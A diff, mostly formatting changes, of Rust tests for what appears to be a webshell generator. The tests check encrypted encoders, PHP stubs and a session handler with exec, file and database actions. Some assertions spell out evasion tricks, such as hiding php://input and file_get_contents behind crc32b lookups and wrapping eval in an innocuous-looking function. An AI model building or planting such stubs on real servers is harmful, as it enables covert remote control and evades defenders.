-                "custom", "native", "native_aes_cbc", "native_aes_ecb",
-                "native_chacha20", "native_des", "native_rabbit",
+                "custom",
+                "native",
+                "native_aes_cbc",
+                "native_aes_ecb",
+                "native_chacha20",
+                "native_des",
+                "native_rabbit",
             ],
             "注册表应暴露 NATIVE 系列 + 自加密编码器 + 自定义（Custom）"
         );
@@ -2399,7 +2535,10 @@ mod tests {
             assert!(!stub.contains(token), "stub 不应含 {token}：{stub}");
         }
         assert!(stub.contains("php://input"), "stub 应基于 php://input");
-        assert!(stub.contains("convert.base64-decode"), "stub 应使用 base64 流过滤器");
+        assert!(
+            stub.contains("convert.base64-decode"),
+            "stub 应使用 base64 流过滤器"
+        );
     }
 
     #[test]
@@ -2414,23 +2553,44 @@ mod tests {
         assert!(stub.contains("DswSesInit"), "stub 应识别初始化标记");
         // OPSEC：请求体读取经符号表 + 字符串拆分（无连续 php://input / file_get_contents）
         assert!(!stub.contains("php://input"), "stub 不应含连续 php://input");
-        assert!(!stub.contains("file_get_contents"), "stub 不应含 file_get_contents 明文");
-        assert!(stub.contains("2693a743"), "stub 符号表应含 file_get_contents 的 crc32b");
-        assert!(stub.contains("$ses = $_SESSION"), "stub 应经间接数组读取 session");
+        assert!(
+            !stub.contains("file_get_contents"),
+            "stub 不应含 file_get_contents 明文"
+        );
+        assert!(
+            stub.contains("2693a743"),
+            "stub 符号表应含 file_get_contents 的 crc32b"
+        );
+        assert!(
+            stub.contains("$ses = $_SESSION"),
+            "stub 应经间接数组读取 session"
+        );
         assert!(stub.contains("run_rule"), "eval 应经业务函数包裹");
         // 处理器：不含 PHP 开标签（eval 执行），含 run 函数与操作分支
         let handler = session_handler_code();
         assert!(!handler.contains("<?php"), "处理器不应含 PHP 开标签");
         assert!(handler.contains("function run"), "处理器应定义 run");
-        for action in ["probe", "exec", "list", "read", "write", "delete", "rename", "mkdir", "dbprobe", "dbquery"] {
-            assert!(handler.contains(&format!("$a === '{action}'")), "处理器应含 {action} 分支");
+        for action in [
+            "probe", "exec", "list", "read", "write", "delete", "rename", "mkdir", "dbprobe",
+            "dbquery",
+        ] {
+            assert!(
+                handler.contains(&format!("$a === '{action}'")),
+                "处理器应含 {action} 分支"
+            );
         }
         // 往返：encode -> stub 的 XOR 解密逻辑还原
         let code = "function run($p){}";
         let payload = XorSessionEncoder.encode(code, "secret");
         let key = md5_hex("secret").into_bytes();
-        let raw = base64::engine::general_purpose::STANDARD.decode(&payload).unwrap();
-        let restored: Vec<u8> = raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect();
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(&payload)
+            .unwrap();
+        let restored: Vec<u8> = raw
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect();
         assert_eq!(String::from_utf8(restored).unwrap(), code);
     }
 
